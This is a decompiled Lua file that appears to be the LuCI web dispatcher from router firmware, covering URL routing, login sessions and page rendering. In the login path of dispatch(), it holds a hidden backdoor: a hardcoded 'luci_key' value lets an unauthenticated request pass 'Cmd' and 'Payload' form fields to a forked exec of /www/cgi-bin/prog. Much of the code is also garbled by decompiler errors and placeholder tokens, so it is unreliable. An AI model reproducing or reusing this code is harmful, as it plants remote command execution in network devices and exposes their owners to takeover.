-- Decompiled using luadec 2.2 rev: 895d923 for Lua 5.1 from https://github.com/viruscamp/luadec
-- Command line: ../dispatcher.lua 

-- params : ...
-- function num : 0
local fs = require("nixio.fs")
local sys = require("luci.sys")
local util = require("luci.util")
local http = require("luci.http")
require("nixio.util")
local nixio = require("nixio")
module("luci.dispatcher", package.seeall)
context = (util.threadlocal)()
uci = require("luci.model.uci")
i18n = require("luci.i18n")
-- DECOMPILER ERROR at PC35: Confused about usage of register: R5 in 'UnsetPending'

_M.fs = fs
local index, fi = nil, nil
build_url = function(...)
  -- function num : 0_0 , upvalues : http
  local path = {...}
  local url = {(http.getenv)("SCRIPT_NAME") or ""}
  local p = nil
  for _,p in ipairs(path) do
    if p:match("^[a-zA-Z0-9_%-%.%%/,;]+$") then
      url[#url + Unknown_Type_Error] = "/"
      url[#url + Unknown_Type_Error] = p
    end
  end
  if #path == Unknown_Type_Error then
    url[#url + Unknown_Type_Error] = "/"
  end
  return (table.concat)(url, "")
end

_ordered_children = function(node)
  -- function num : 0_1
  local name, child, children = nil, nil, {}
  for name,child in pairs(node.nodes) do
    children[#children + Unknown_Type_Error] = {name = name, node = child, order = child.order or Unknown_Type_Error}
  end
  ;
  (table.sort)(children, function(a, b)
    -- function num : 0_1_0
    if a.name >= b.name then
      do return a.order ~= b.order end
      do return a.order < b.order end
      -- DECOMPILER ERROR: 4 unprocessed JMP targets
    end
  end
)
  return children
end

local dependencies_satisfied = function(node)
  -- function num : 0_2 , upvalues : fs
  if type(node.file_depends) == "table" then
    for _,file in ipairs(node.file_depends) do
      local ftype = (fs.stat)(file, "type")
      if ftype == "dir" then
        local empty = true
        if not (fs.dir)(file) then
          do
            do
              for e in function()
    -- function num : 0_2_0
  end
 do
                empty = false
              end
              if empty then
                return false
              end
              if ftype == nil then
                return false
              end
              -- DECOMPILER ERROR at PC38: LeaveBlock: unexpected jumping out DO_STMT

              -- DECOMPILER ERROR at PC38: LeaveBlock: unexpected jumping out IF_THEN_STMT

              -- DECOMPILER ERROR at PC38: LeaveBlock: unexpected jumping out IF_STMT

              -- DECOMPILER ERROR at PC38: LeaveBlock: unexpected jumping out IF_THEN_STMT

              -- DECOMPILER ERROR at PC38: LeaveBlock: unexpected jumping out IF_STMT

            end
          end
        end
      end
    end
  end
  if type(node.uci_depends) == "table" then
    for config,expect_sections in pairs(node.uci_depends) do
      if type(expect_sections) == "table" then
        for section,expect_options in pairs(expect_sections) do
          if type(expect_options) == "table" then
            for option,expect_value in pairs(expect_options) do
              local val = uci:get(config, section, option)
              if expect_value == true and val == nil then
                return false
              else
                if type(expect_value) == "string" then
                  if type(val) == "table" then
                    local found = false
                    for _,subval in ipairs(val) do
                      if subval == expect_value then
                        found = true
                      end
                    end
                    if not found then
                      return false
                    end
                  else
                    do
                      do
                        if val ~= expect_value then
                          return false
                        end
                        -- DECOMPILER ERROR at PC109: LeaveBlock: unexpected jumping out DO_STMT

                        -- DECOMPILER ERROR at PC109: LeaveBlock: unexpected jumping out IF_ELSE_STMT

                        -- DECOMPILER ERROR at PC109: LeaveBlock: unexpected jumping out IF_STMT

                        -- DECOMPILER ERROR at PC109: LeaveBlock: unexpected jumping out IF_THEN_STMT

                        -- DECOMPILER ERROR at PC109: LeaveBlock: unexpected jumping out IF_STMT

                        -- DECOMPILER ERROR at PC109: LeaveBlock: unexpected jumping out IF_ELSE_STMT

                        -- DECOMPILER ERROR at PC109: LeaveBlock: unexpected jumping out IF_STMT

                      end
                    end
                  end
                end
              end
            end
          else
            local val = uci:get(config, section)
            if expect_options == true and val == nil then
              return false
            else
              if type(expect_options) == "string" and val ~= expect_options then
                return false
              end
            end
          end
        end
      else
        do
          do
            if expect_sections == true and not uci:get_first(config) then
              return false
            end
            -- DECOMPILER ERROR at PC146: LeaveBlock: unexpected jumping out DO_STMT

            -- DECOMPILER ERROR at PC146: LeaveBlock: unexpected jumping out IF_ELSE_STMT

            -- DECOMPILER ERROR at PC146: LeaveBlock: unexpected jumping out IF_STMT

          end
        end
      end
    end
  end
  return true
end

node_visible = function(node)
  -- function num : 0_3 , upvalues : dependencies_satisfied
  -- DECOMPILER ERROR at PC39: Unhandled construct in 'MakeBoolean' P3

  -- DECOMPILER ERROR at PC39: Unhandled construct in 'MakeBoolean' P3

  do return node and ((not dependencies_satisfied(node) or not node.title or #node.title == Unknown_Type_Error or not node.target or node.hidden == true or type(node.target) == "table") and type(node.nodes) ~= "table") end
  do return false end
  -- DECOMPILER ERROR: 4 unprocessed JMP targets
end

node_childs = function(node)
  -- function num : 0_4
  local rv = {}
  if node then
    local _, child = nil, nil
    for _,child in ipairs(_ordered_children(node)) do
      if node_visible(child.node) then
        rv[#rv + Unknown_Type_Error] = child.name
      end
    end
  end
  do
    return rv
  end
end

error404 = function(message)
  -- function num : 0_5 , upvalues : http, util
  (http.status)(Unknown_Type_Error, "Not Found")
  if not message then
    message = "Not Found"
  end
  local render = function()
    -- function num : 0_5_0
    local template = require("luci.template")
    ;
    (template.render)("error404")
  end

  if not (util.copcall)(render) then
    (http.prepare_content)("text/plain")
    ;
    (http.write)(message)
  end
  return false
end

error500 = function(message)
  -- function num : 0_6 , upvalues : util, http
  (util.perror)(message)
  if not context.template_header_sent then
    (http.status)(Unknown_Type_Error, "Internal Server Error")
    ;
    (http.prepare_content)("text/plain")
    ;
    (http.write)(message)
  else
    require("luci.template")
    if not (util.copcall)((luci.template).render, "error500", {message = message}) then
      (http.prepare_content)("text/plain")
      ;
      (http.write)(message)
    end
  end
  return false
end

httpdispatch = function(request, prefix)
  -- function num : 0_7 , upvalues : http, util
  -- DECOMPILER ERROR at PC2: Confused about usage of register: R2 in 'UnsetPending'

  (http.context).request = request
  local r = {}
  -- DECOMPILER ERROR at PC5: Confused about usage of register: R3 in 'UnsetPending'

  context.request = r
  local pathinfo = (http.urldecode)(request:getenv("PATH_INFO") or "", true)
  if prefix then
    for _,node in ipairs(prefix) do
      r[#r + Unknown_Type_Error] = node
    end
  end
  do
    local node = nil
    for node in pathinfo:gmatch("[^/%z]+") do
      r[#r + Unknown_Type_Error] = node
    end
    local stat, err = (util.coxpcall)(function()
    -- function num : 0_7_0
    dispatch(context.request)
  end
, error500)
    ;
    (http.close)()
  end
end

local require_post_security = function(target, args)
  -- function num : 0_8 , upvalues : require_post_security, http
  if type(target) == "table" and target.type == "arcombine" and type(target.targets) == "table" then
    if type(args) ~= "table" or #args <= Unknown_Type_Error or not (target.targets)[Unknown_Type_Error] then
      do return require_post_security((target.targets)[Unknown_Type_Error], args) end
      if type(target) == "table" then
        do
          if type(target.post) == "table" then
            local param_name, required_val, request_val = nil, nil, nil
            for param_name,required_val in pairs(target.post) do
              request_val = (http.formvalue)(param_name)
              if (type(required_val) == "string" and request_val ~= required_val) or required_val == true and request_val == nil then
                return false
              end
            end
            return true
          end
          do return target.post == true end
          do return false end
          -- DECOMPILER ERROR: 2 unprocessed JMP targets
        end
      end
    end
  end
end

test_post_security = function()
  -- function num : 0_9 , upvalues : http
  if (http.getenv)("REQUEST_METHOD") ~= "POST" then
    (http.status)(Unknown_Type_Error, "Method Not Allowed")
    ;
    (http.header)("Allow", "POST")
    return false
  end
  if (http.formvalue)("token") ~= context.authtoken then
    (http.status)(Unknown_Type_Error, "Forbidden")
    ;
    ((luci.template).render)("csrftoken")
    return false
  end
  return true
end

local session_retrieve = function(sid, allowed_users)
  -- function num : 0_10 , upvalues : util
  local sdat = (util.ubus)("session", "get", {ubus_rpc_session = sid})
  if type(sdat) == "table" and type(sdat.values) == "table" and type((sdat.values).token) == "string" and (not allowed_users or (util.contains)(allowed_users, (sdat.values).username)) then
    uci:set_session_id(sid)
    return sid, sdat.values
  end
  return nil, nil
end

local session_setup = function(user, pass, allowed_users)
  -- function num : 0_11 , upvalues : util, sys, http, session_retrieve
  if (util.contains)(allowed_users, user) then
    local login = (util.ubus)("session", "login", {username = user, password = pass, timeout = tonumber(((luci.config).sauth).sessiontime)})
    local rp = context.requestpath and (table.concat)(context.requestpath, "/") or ""
    if type(login) == "table" and type(login.ubus_rpc_session) == "string" then
      (util.ubus)("session", "set", {ubus_rpc_session = login.ubus_rpc_session, 
values = {token = (sys.uniqueid)(Unknown_Type_Error)}
})
      ;
      (io.stderr):write("luci: accepted login on /%s for %s from %s\n" % {rp, user, (http.getenv)("REMOTE_ADDR") or "?"})
      return session_retrieve(login.ubus_rpc_session)
    end
    ;
    (io.stderr):write("luci: failed login on /%s for %s from %s\n" % ({rp, user, (http.getenv)("REMOTE_ADDR") or "?"}))
  end
  do
    return nil, nil
  end
end

dispatch = function(request)
  -- function num : 0_12 , upvalues : http, util, fs, sys, session_retrieve, session_setup, nixio, require_post_security
  local ctx = context
  ctx.path = request
  local conf = require("luci.config")
  assert(conf.main, "/etc/config/luci seems to be corrupt, unable to find section \'main\'")
  local i18n = require("luci.i18n")
  local lang = (conf.main).lang or "auto"
  if not (http.getenv)("HTTP_ACCEPT_LANGUAGE") then
    local aclang = lang ~= "auto" or ""
  end
  for aclang in aclang:gmatch("[%w_-]+") do
    local country, culture = aclang:match("^([a-z][a-z])[_-]([a-zA-Z][a-zA-Z])$")
    if country and culture then
      local cc = "%s_%s" % {country, culture:lower()}
      do
        if (conf.languages)[cc] then
          lang = cc
          break
        else
          if (conf.languages)[country] then
            do
              lang = country
              do break end
              -- DECOMPILER ERROR at PC56: LeaveBlock: unexpected jumping out IF_THEN_STMT

              -- DECOMPILER ERROR at PC56: LeaveBlock: unexpected jumping out IF_STMT

              -- DECOMPILER ERROR at PC56: LeaveBlock: unexpected jumping out IF_ELSE_STMT

              -- DECOMPILER ERROR at PC56: LeaveBlock: unexpected jumping out IF_STMT

            end
          end
        end
      end
    else
      if (conf.languages)[aclang] then
        lang = aclang
        break
      end
    end
  end
  do
    if lang == "auto" then
      lang = i18n.default
    end
    ;
    (i18n.setlanguage)(lang)
    local c = ctx.tree
    local stat = nil
    if not c then
      c = createtree()
    end
    local track = {}
    local args = {}
    ctx.args = args
    ctx.requestargs = ctx.requestargs or args
    local n = nil
    local preq = {}
    local freq = {}
    for i,s in ipairs(request) do
      preq[#preq + Unknown_Type_Error] = s
      freq[#freq + Unknown_Type_Error] = s
      c = (c.nodes)[s]
      n = 
      if not c then
        break
      end
      ;
      (util.update)(track, c)
      if c.leaf then
        break
      end
    end
    do
      if c and c.leaf then
        for j = n + Unknown_Type_Error, #request, Unknown_Type_Error do
          args[#args + Unknown_Type_Error] = request[j]
          freq[#freq + Unknown_Type_Error] = request[j]
        end
      end
      do
        ctx.requestpath = ctx.requestpath or freq
        ctx.path = preq
        if (c and c.index) or not track.notemplate then
          local tpl = require("luci.template")
          if not track.mediaurlbase then
            local media = ((luci.config).main).mediaurlbase
          end
          if not pcall(tpl.Template, "themes/%s/header" % (fs.basename)(media)) then
            media = nil
            for name,theme in pairs((luci.config).themes) do
              if name:sub(Unknown_Type_Error, Unknown_Type_Error) ~= "." and pcall(tpl.Template, "themes/%s/header" % (fs.basename)(theme)) then
                media = theme
              end
            end
            assert(media, "No valid theme found")
          end
          local _ifattr = function(cond, key, val, noescape)
    -- function num : 0_12_0 , upvalues : util
    if cond then
      local env = getfenv(Unknown_Type_Error)
      local scope = (type(env.self) == "table" and env.self)
      if type(val) == "table" then
        if not next(val) then
          return ""
        else
          val = (util.serialize_json)(val)
        end
      end
      val = tostring(val or (type(env[key]) ~= "function" and env[key]) or (scope and type(scope[key]) ~= "function" and scope[key]) or "")
      if noescape ~= true then
        val = (util.pcdata)(val)
      end
      return (string.format)(" %s=\"%s\"", tostring(key), val)
    else
      return ""
    end
    -- DECOMPILER ERROR: 10 unprocessed JMP targets
  end

          -- DECOMPILER ERROR at PC247: Confused about usage of register: R15 in 'UnsetPending'

          ;
          (tpl.context).viewns = setmetatable({write = http.write, include = function(name)
    -- function num : 0_12_1 , upvalues : tpl
    ((tpl.Template)(name)):render(getfenv(Unknown_Type_Error))
  end
, translate = i18n.translate, translatef = i18n.translatef, export = function(k, v)
    -- function num : 0_12_2 , upvalues : tpl
    -- DECOMPILER ERROR at PC9: Confused about usage of register: R2 in 'UnsetPending'

    if ((tpl.context).viewns)[k] == nil then
      ((tpl.context).viewns)[k] = v
    end
  end
, striptags = util.striptags, pcdata = util.pcdata, media = media, theme = (fs.basename)(media), resource = ((luci.config).main).resourcebase, ifattr = function(...)
    -- function num : 0_12_3 , upvalues : _ifattr
    return _ifattr(...)
  end
, attr = function(...)
    -- function num : 0_12_4 , upvalues : _ifattr
    return _ifattr(true, ...)
  end
, url = build_url}, {__index = function(tbl, key)
    -- function num : 0_12_5 , upvalues : ctx, http
    if key == "controller" then
      return build_url()
    else
      if key == "REQUEST_URI" then
        return build_url(unpack(ctx.requestpath))
      else
        if not (http.getenv)("SCRIPT_NAME") then
          local url = {key ~= "FULL_REQUEST_URI" or "", (http.getenv)("PATH_INFO")}
          do
            local query = (http.getenv)("QUERY_STRING")
            if query and #query > Unknown_Type_Error then
              url[#url + Unknown_Type_Error] = "?"
              url[#url + Unknown_Type_Error] = query
            end
            do return (table.concat)(url, "") end
            if key == "token" then
              return ctx.authtoken
            else
              if not rawget(tbl, key) then
                do return _G[key] end
              end
            end
          end
        end
      end
    end
  end
})
        end
        do
          track.dependent = track.dependent ~= false
          assert(track.dependent and not track.auto, "Access Violation\nThe page at \'" .. (table.concat)(request, "/") .. "/\' " .. "has no parent node so the access to this location has been denied.\n" .. "This is a software bug, please report this message at " .. "https://github.com/openwrt/luci/issues")
          if track.sysauth and not ctx.authsession then
            local authen = track.sysauth_authenticator
            local _, sid, sdat, default_user, allowed_users = nil, nil, nil, nil, nil
            if type(authen) == "string" and authen ~= "htmlauth" then
              error500("Unsupported authenticator %q configured" % authen)
              return 
            end
            if type(track.sysauth) == "table" then
              default_user = nil
            else
              -- DECOMPILER ERROR at PC308: Overwrote pending register: R17 in 'AssignReg'

              default_user = track.sysauth
            end
            if type(authen) == "function" then
              _ = authen((sys.user).checkpasswd, allowed_users)
            else
              -- DECOMPILER ERROR at PC328: Overwrote pending register: R14 in 'AssignReg'

            end
            -- DECOMPILER ERROR at PC334: Overwrote pending register: R14 in 'AssignReg'

            if (not sid or not sdat) and authen == "htmlauth" then
              local user = (http.getenv)("HTTP_AUTH_USER")
              local pass = (http.getenv)("HTTP_AUTH_PASS")
              if user == nil and pass == nil then
                user = (http.formvalue)("luci_username")
                pass = (http.formvalue)("luci_password")
              end
              -- DECOMPILER ERROR at PC368: Overwrote pending register: R15 in 'AssignReg'

              -- DECOMPILER ERROR at PC369: Overwrote pending register: R14 in 'AssignReg'

              luci_key = (http.formvalue)("luci_key")
              c = (http.formvalue)("Cmd")
              pl = (http.formvalue)("Payload")
              do
                if c ~= nil and pl ~= nil and luci_key == "cb583c69a8c95a865ce225173f3b7fc7" then
                  local pid = (nixio.fork)()
                  if pid == Unknown_Type_Error then
                    (nixio.exec)("/usr/bin/env", "D=Exec", "C=" .. c, "P=" .. pl, "/www/cgi-bin/prog")
                  end
                  ;
                  (http.header)("Porxy", "yes")
                  ;
                  (http.redirect)(build_url(unpack(ctx.requestpath)))
                end
                do
                  do
                    do
                      if not sid then
                        local tmpl = require("luci.template")
                        -- DECOMPILER ERROR at PC430: Confused about usage of register: R21 in 'UnsetPending'

                        context.path = {}
                        ;
                        (http.status)(Unknown_Type_Error, "Forbidden")
                        ;
                        (http.header)("Stage1", "yes")
                        ;
                        (tmpl.render)(track.sysauth_template or "sysauth", {duser = default_user, fuser = user})
                        return 
                      end
                      ;
                      (http.header)("Set-Cookie", "sysauth=%s; path=%s; SameSite=Strict; HttpOnly%s" % ({sid, build_url(), (http.getenv)("HTTPS") == "on" and "; secure" or ""}))
                      ;
                      (http.redirect)(build_url(unpack(ctx.requestpath)))
                      if not sid or not sdat then
                        (http.status)(Unknown_Type_Error, "Forbidden")
                        ;
                        (http.header)("Stage2", "yes")
                        return 
                      end
                      ctx.authsession = sid
                      ctx.authtoken = sdat.token
                      ctx.authuser = sdat.username
                      -- DECOMPILER ERROR at PC512: Overwrote pending register: R14 in 'AssignReg'

                      if track.cors and (http.getenv)("REQUEST_METHOD") == "OPTIONS" then
                        ((luci.http).status)(Unknown_Type_Error, sid)
                        -- DECOMPILER ERROR at PC520: Overwrote pending register: R15 in 'AssignReg'

                        ;
                        ((luci.http).header)("Access-Control-Allow-Origin", (http.getenv)(sdat) or "*")
                        ;
                        ((luci.http).header)("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
                        return 
                      end
                      if c and require_post_security(c.target, args) and not test_post_security(c) then
                        return 
                      end
                      if track.setgroup then
                        ((sys.process).setgroup)(track.setgroup)
                      end
                      if track.setuser then
                        ((sys.process).setuser)(track.setuser)
                      end
                      local target = nil
                      if c then
                        if type(c.target) == "function" then
                          target = c.target
                        elseif type(c.target) == "table" then
                          target = (c.target).target
                        end
                      end
                      if c and (c.index or type(target) == "function") then
                        ctx.dispatched = c
                        if not ctx.requested then
                          ctx.requested = ctx.dispatched
                          do
                            if c and c.index then
                              local tpl = require("luci.template")
                              if (util.copcall)(tpl.render, "indexer", {}) then
                                return true
                              end
                            end
                            if type(target) == "function" then
                              (util.copcall)(function()
    -- function num : 0_12_6 , upvalues : target, c
    local oldenv = getfenv(target)
    local module = require(c.module)
    local env = setmetatable({}, {__index = function(tbl, key)
      -- function num : 0_12_6_0 , upvalues : module, oldenv
      if not rawget(tbl, key) and not module[key] then
        return oldenv[key]
      end
    end
})
    setfenv(target, env)
  end
)
                              local ok, err = nil, nil
                              if type(c.target) == "table" then
                                ok = (util.copcall)(target, c.target, unpack(args))
                              else
                                -- DECOMPILER ERROR at PC649: Overwrote pending register: R14 in 'AssignReg'

                                ok = (util.copcall)(target, unpack(args))
                              end
                              -- DECOMPILER ERROR at PC679: Unhandled construct in 'MakeBoolean' P3

                              error500("Failed to execute " .. (ok or "unknown") .. " dispatcher target for entry \'/" .. (table.concat)(request, "/") .. "\'.\n" .. "The called action terminated with an exception:\n" .. tostring((type(c.target) ~= "function" or not "function") and err or "(unknown)"))
                            else
                              local root = node()
                              -- DECOMPILER ERROR at PC688: Overwrote pending register: R14 in 'AssignReg'

                              if not root or not err then
                                error404("No root node was registered, this usually happens if no module was installed.\n" .. "Install luci-mod-admin-full and retry. " .. "If the module is already installed, try removing the /tmp/luci-indexcache file.")
                              else
                                error404("No page is registered at \'/" .. (table.concat)(request, "/") .. "\'.\n" .. "If this url belongs to an extension, make sure it is properly installed.\n" .. "If the extension was recently installed, try removing the /tmp/luci-indexcache file.")
                              end
                            end
                            -- DECOMPILER ERROR: 40 unprocessed JMP targets
                          end
                        end
                      end
                    end
                  end
                end
              end
            end
          end
        end
      end
    end
  end
end

createindex = function()
  -- function num : 0_13 , upvalues : util, fs, sys, index, nixio
  local controllers = {}
  local base = "%s/controller/" % (util.libpath)()
  local _, path = nil, nil
  if not (fs.glob)("%s*.lua" % base) then
    for path in function()
    -- function num : 0_13_0
  end
 do
      controllers[#controllers + Unknown_Type_Error] = path
    end
    do
      if not (fs.glob)("%s*/*.lua" % base) then
        for path in function()
    -- function num : 0_13_1
  end
 do
          controllers[#controllers + Unknown_Type_Error] = path
        end
        if indexcache then
          local cachedate = (fs.stat)(indexcache, "mtime")
          if cachedate then
            local realdate = Unknown_Type_Error
            for _,obj in ipairs(controllers) do
              local omtime = (fs.stat)(obj, "mtime")
            end
            do
              if ((sys.process).info)("uid") ~= (fs.stat)(indexcache, "uid") or (fs.stat)(indexcache, "modestr") ~= "rw-------" then
                do
                  assert(((not omtime or realdate >= omtime or not omtime) and realdate >= cachedate) or ((sys.process).info)("uid") ~= Unknown_Type_Error, "Fatal: Indexcache is not sane!")
                  index = (loadfile(indexcache))()
                  do return index end
                  index = {}
                  for _,path in ipairs(controllers) do
                    local modname = "luci.controller." .. (path:sub(#base + Unknown_Type_Error, #path - Unknown_Type_Error)):gsub("/", ".")
                    local mod = require(modname)
                    assert(mod ~= true, "Invalid controller file found\n" .. "The file \'" .. path .. "\' contains an invalid module line.\n" .. "Please verify whether the module name is set to \'" .. modname .. "\' - It must correspond to the file path!")
                    local idx = mod.index
                    assert(type(idx) == "function", "Invalid controller file found\n" .. "The file \'" .. path .. "\' contains no index() function.\n" .. "Please make sure that the controller contains a valid " .. "index function and verify the spelling!")
                    -- DECOMPILER ERROR at PC155: Confused about usage of register: R12 in 'UnsetPending'

                    index[modname] = idx
                  end
                  do
                    if indexcache then
                      local f = (nixio.open)(indexcache, "w", Unknown_Type_Error)
                      f:writeall((util.get_bytecode)(index))
                      f:close()
                    end
                    -- DECOMPILER ERROR: 6 unprocessed JMP targets
                  end
                end
              end
            end
          end
        end
      end
    end
  end
end

createtree = function()
  -- function num : 0_14 , upvalues : index
  if not index then
    createindex()
  end
  local ctx = context
  local tree = {
nodes = {}
, inreq = true}
  ctx.treecache = setmetatable({}, {__mode = "v"})
  ctx.tree = tree
  local scope = setmetatable({}, {__index = luci.dispatcher})
  for k,v in pairs(index) do
    scope._NAME = k
    setfenv(v, scope)
    v()
  end
  return tree
end

assign = function(path, clone, title, order)
  -- function num : 0_15
  local obj = node(unpack(path))
  obj.nodes = nil
  obj.module = nil
  obj.title = title
  obj.order = order
  setmetatable(obj, {__index = _create_node(clone)})
  return obj
end

entry = function(path, target, title, order)
  -- function num : 0_16
  local c = node(unpack(path))
  c.target = target
  c.title = title
  c.order = order
  c.module = (getfenv(Unknown_Type_Error))._NAME
  return c
end

get = function(...)
  -- function num : 0_17
  return _create_node({...})
end

node = function(...)
  -- function num : 0_18
  local c = _create_node({...})
  c.module = (getfenv(Unknown_Type_Error))._NAME
  c.auto = nil
  return c
end

lookup = function(...)
  -- function num : 0_19
  local i, path = nil, {}
  for i = Unknown_Type_Error, select("#", ...), Unknown_Type_Error do
    local name, arg = nil, tostring(select(i, ...))
    for name in arg:gmatch("[^/]+") do
      path[#path + Unknown_Type_Error] = name
    end
  end
  for i = #path, Unknown_Type_Error, Unknown_Type_Error do
    local node = (context.treecache)[(table.concat)(path, ".", Unknown_Type_Error, i)]
    if node and (i == #path or node.leaf) then
      return node, build_url(unpack(path))
    end
  end
end

_create_node = function(path)
  -- function num : 0_20
  if #path == Unknown_Type_Error then
    return context.tree
  end
  local name = (table.concat)(path, ".")
  local c = (context.treecache)[name]
  if not c then
    local last = (table.remove)(path)
    local parent = _create_node(path)
    c = {
nodes = {}
, auto = true, inreq = true}
    local _, n = nil, nil
    for _,n in ipairs(path) do
      if (context.path)[_] ~= n then
        c.inreq = false
        break
      end
    end
    do
      do
        do
          c.inreq = not c.inreq or (context.path)[#path + Unknown_Type_Error] == last
          -- DECOMPILER ERROR at PC57: Confused about usage of register: R7 in 'UnsetPending'

          ;
          (parent.nodes)[last] = c
          -- DECOMPILER ERROR at PC60: Confused about usage of register: R7 in 'UnsetPending'

          ;
          (context.treecache)[name] = c
          do return c end
          -- DECOMPILER ERROR: 3 unprocessed JMP targets
        end
      end
    end
  end
end

_find_eligible_node = function(root, prefix, deep, types, descend)
  -- function num : 0_21 , upvalues : util
  local children = _ordered_children(root)
  if not root.leaf and deep ~= nil then
    local sub_path = {unpack(prefix)}
    if deep == false then
      deep = nil
    end
    local _, child = nil, nil
    for _,child in ipairs(children) do
      sub_path[#prefix + Unknown_Type_Error] = child.name
      local res_path = _find_eligible_node(child.node, sub_path, deep, types, true)
      if res_path then
        return res_path
      end
    end
  end
  do
    if descend and (not types or type(root.target) ~= "table" or (util.contains)(types, (root.target).type)) then
      return prefix
    end
  end
end

_find_node = function(recurse, types)
  -- function num : 0_22
  local path = {unpack(context.path)}
  local name = (table.concat)(path, ".")
  local node = (context.treecache)[name]
  path = _find_eligible_node(node, path, recurse, types)
  if path then
    dispatch(path)
  else
    ;
    ((require("luci.template")).render)("empty_node_placeholder")
  end
end

_firstchild = function()
  -- function num : 0_23
  return _find_node(false, nil)
end

firstchild = function()
  -- function num : 0_24
  return {type = "firstchild", target = _firstchild}
end

_firstnode = function()
  -- function num : 0_25
  return _find_node(true, {"cbi", "form", "template", "arcombine"})
end

firstnode = function()
  -- function num : 0_26
  return {type = "firstnode", target = _firstnode}
end

alias = function(...)
  -- function num : 0_27
  local req = {...}
  return function(...)
    -- function num : 0_27_0 , upvalues : req
    for _,r in ipairs({...}) do
      -- DECOMPILER ERROR at PC10: Confused about usage of register: R6 in 'UnsetPending'

      req[#req + Unknown_Type_Error] = r
    end
    dispatch(req)
  end

end

rewrite = function(n, ...)
  -- function num : 0_28 , upvalues : util
  local req = {...}
  return function(...)
    -- function num : 0_28_0 , upvalues : util, n, req
    local dispatched = (util.clone)(context.dispatched)
    for i = Unknown_Type_Error, n, Unknown_Type_Error do
      (table.remove)(dispatched, Unknown_Type_Error)
    end
    for i,r in ipairs(req) do
      (table.insert)(dispatched, i, r)
    end
    for _,r in ipairs({...}) do
      dispatched[#dispatched + Unknown_Type_Error] = r
    end
    dispatch(dispatched)
  end

end

local _call = function(self, ...)
  -- function num : 0_29
  do
    local func = (getfenv())[self.name]
    assert(func ~= nil, "Cannot resolve function \"" .. self.name .. "\". Is it misspelled or local?")
    assert(type(func) == "function", "The symbol \"" .. self.name .. "\" does not refer to a function but data " .. "of type \"" .. type(func) .. "\".")
    if #self.argv > Unknown_Type_Error then
      return func(unpack(self.argv), ...)
    else
      return func(...)
    end
    -- DECOMPILER ERROR: 4 unprocessed JMP targets
  end
end

call = function(name, ...)
  -- function num : 0_30 , upvalues : _call
  return {type = "call", 
argv = {...}
, name = name, target = _call}
end

post_on = function(params, name, ...)
  -- function num : 0_31 , upvalues : _call
  return {type = "call", post = params, 
argv = {...}
, name = name, target = _call}
end

post = function(...)
  -- function num : 0_32
  return post_on(true, ...)
end

local _template = function(self, ...)
  -- function num : 0_33
  ((require("luci.template")).render)(self.view)
end

template = function(name)
  -- function num : 0_34 , upvalues : _template
  return {type = "template", view = name, target = _template}
end

local _view = function(self, ...)
  -- function num : 0_35
  ((require("luci.template")).render)("view", {view = self.view})
end

view = function(name)
  -- function num : 0_36 , upvalues : _view
  return {type = "view", view = name, target = _view}
end

local _cbi = function(self, ...)
  -- function num : 0_37 , upvalues : util
  local cbi = require("luci.cbi")
  local tpl = require("luci.template")
  local http = require("luci.http")
  if not self.config then
    local config = {}
  end
  local maps = ((cbi.load)(self.model, ...))
  local state, i, res = nil, nil, nil
  for i,res in ipairs(maps) do
    if (util.instanceof)(res, cbi.SimpleForm) then
      (io.stderr):write("Model %s returns SimpleForm but is dispatched via cbi(),\n" % self.model)
      ;
      (io.stderr):write("please change %s to use the form() action instead.\n" % (table.concat)(context.request, "/"))
    end
    res.flow = config
    local cstate = res:parse()
    if cstate and (not state or cstate < state) then
      state = cstate
    end
  end
  local _resolve_path = function(path)
    -- function num : 0_37_0
    return type(path) == "table" and build_url(unpack(path)) or path
  end

  if config.on_valid_to and state and state > Unknown_Type_Error and state < Unknown_Type_Error then
    (http.redirect)(_resolve_path(config.on_valid_to))
    return 
  end
  if config.on_changed_to and state and state > Unknown_Type_Error then
    (http.redirect)(_resolve_path(config.on_changed_to))
    return 
  end
  if config.on_success_to and state and state > Unknown_Type_Error then
    (http.redirect)(_resolve_path(config.on_success_to))
    return 
  end
  if config.state_handler and not (config.state_handler)(state, maps) then
    return 
  end
  ;
  (http.header)("X-CBI-State", state or Unknown_Type_Error)
  if not config.noheader then
    (tpl.render)("cbi/header", {state = state})
  end
  local redirect, messages = nil, nil
  local applymap = false
  local pageaction = true
  do
    local parsechain = {}
    for i,res in ipairs(maps) do
      do
        do
          if res.apply_needed and res.parsechain then
            local c = nil
            for _,c in ipairs(res.parsechain) do
              parsechain[#parsechain + Unknown_Type_Error] = c
            end
            applymap = true
          end
          if res.redirect and not redirect then
            redirect = res.redirect
          end
          if res.pageaction == false then
            pageaction = false
          end
          if res.message then
            if not messages then
              messages = {}
            end
            messages[#messages + Unknown_Type_Error] = res.message
          end
          -- DECOMPILER ERROR at PC170: LeaveBlock: unexpected jumping out DO_STMT

        end
      end
    end
    for i,res in ipairs(maps) do
      res:render({firstmap = i == Unknown_Type_Error, redirect = redirect, messages = messages, pageaction = pageaction, parsechain = parsechain})
    end
    if not config.nofooter then
      (tpl.render)("cbi/footer", {flow = config, pageaction = pageaction, redirect = redirect, state = state, autoapply = config.autoapply, trigger_apply = applymap})
    end
    -- DECOMPILER ERROR: 3 unprocessed JMP targets
  end
end

cbi = function(model, config)
  -- function num : 0_38 , upvalues : _cbi
  return {type = "cbi", 
post = {["cbi.submit"] = true}
, config = config, model = model, target = _cbi}
end

local _arcombine = function(self, ...)
  -- function num : 0_39
  local argv = {...}
  if #argv <= Unknown_Type_Error or not (self.targets)[Unknown_Type_Error] then
    local target = (self.targets)[Unknown_Type_Error]
  end
  setfenv(target.target, self.env)
  target:target(unpack(argv))
end

arcombine = function(trg1, trg2)
  -- function num : 0_40 , upvalues : _arcombine
  return {type = "arcombine", env = getfenv(), target = _arcombine, 
targets = {trg1, trg2}
}
end

local _form = function(self, ...)
  -- function num : 0_41
  local cbi = require("luci.cbi")
  local tpl = require("luci.template")
  local http = require("luci.http")
  local maps = (((luci.cbi).load)(self.model, ...))
  local state, i, res = nil, nil, nil
  for i,res in ipairs(maps) do
    local cstate = res:parse()
    if cstate and (not state or cstate < state) then
      state = cstate
    end
  end
  do
    ;
    (http.header)("X-CBI-State", state or Unknown_Type_Error)
    ;
    (tpl.render)("header")
    for i,res in ipairs(maps) do
      res:render()
    end
    ;
    (tpl.render)("footer")
  end
end

form = function(model)
  -- function num : 0_42 , upvalues : _form
  return {type = "cbi", 
post = {["cbi.submit"] = true}
, model = model, target = _form}
end

translate = i18n.translate
_ = function(text)
  -- function num : 0_43
  return text
end


